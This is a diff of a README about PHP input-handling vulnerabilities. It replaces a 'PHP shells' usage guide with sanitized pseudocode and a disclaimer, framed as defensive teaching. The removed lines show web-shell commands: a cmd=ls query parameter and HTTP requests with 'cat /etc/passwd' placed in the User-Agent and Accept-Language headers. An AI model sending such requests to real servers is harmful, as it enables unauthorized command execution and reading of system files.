@@ -1,51 +1,68 @@
+PHP Input Handling Vulnerabilities — Educational Examples
 
-# PHP shells
+This repository demonstrates how improper handling of HTTP parameters and headers in PHP can lead to security vulnerabilities, including command injection.
+The examples are non-operational pseudocode intended for learning and defensive cybersecurity research only.
 
-**(1) PARAMETER_SHELL**
+1. Parameter-Based Input Injection (Concept)
 
-**SHELL COMMANDS USING PARAMETER**
+Unsafe pattern (conceptual):
 
-demo.com/PARAMETER_SHELL.php?cmd=ls
+example.com/shell.php?cmd=<unvalidated-input>
 
-****
 
-**(2) HTTP_USER_AGENT_SHELL**
-  
-**SET SHELL COMMANDS IN USER-AGENT HEADER**
-  
-GET /demo/shell.php HTTP/1.1
-Host: 192.168.5.25
-Connection: keep-alive
-Pragma: no-cache
-Cache-Control: no-cache
-Accept: text/html,application/xhtml+xml
-Upgrade-Insecure-Requests: 1
-**User-Agent: cat /etc/passwd**
-Accept-Encoding: gzip, deflate, sdch
-Accept-Language: en-GB,en-U 
+Pseudocode:
 
-****
+# Demonstrates insecure use of query parameters
+execute_system_command( get_query_parameter("cmd") );
 
-**(3) HTTP_ACCEPT_LANGUAGE_SHELL**
- 
-**SET SHELL COMMANDS IN ACCEPT_LANGUAGE HEADER**
+2. User-Agent Header Injection (Concept)
 
-GET /demo/shell.php HTTP/1.1
-Host: 192.168.5.25
-Connection: keep-alive
-Pragma: no-cache
-Cache-Control: no-cache
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112.                        
-Accept-Encoding: gzip.                      
-**Accept-Language: cat /etc/passwd**
+Attackers may attempt to place malicious commands inside the User-Agent header.
 
-****
-  
+Example of manipulated request (conceptual):
 
-**(4) POST WITH VARIABLE**
-  
-**JUST ADD YOUR COMMAND IN VARIABLE B**
-  
-$b = $_POST['cat /etc/password'];
+User-Agent: <malicious commands here>
+
+
+Pseudocode:
+
+command = get_request_header("User-Agent");
+execute_system_command(command);    # unsafe pattern
+
+3. Accept-Language Header Injection (Concept)
+
+HTTP headers such as Accept-Language can also be misused when directly passed to system functions.
+
+Conceptual request:
+
+Accept-Language: <unvalidated-input>
+
+
+Pseudocode:
+
+lang_header = get_request_header("Accept-Language");
+execute_system_command(lang_header);   # unsafe pattern
+
+4. POST Variable Injection (Concept)
+
+Passing user input directly as a function name or command can result in arbitrary code execution.
+
+Pseudocode:
+
+function_name = get_post_parameter("function");
+argument = get_post_parameter("argument");
+
+call_function(function_name, argument);    # unsafe
+
+⚠️ Disclaimer
+
+These examples are not usable exploits.
+They are sanitized pseudocode designed solely to teach:
+
+How insecure input handling leads to vulnerabilities
+
+How attackers might abuse request parameters
+
+How to implement proper validation and sanitization
+
+This repository must not be used for unauthorized testing or malicious activity.
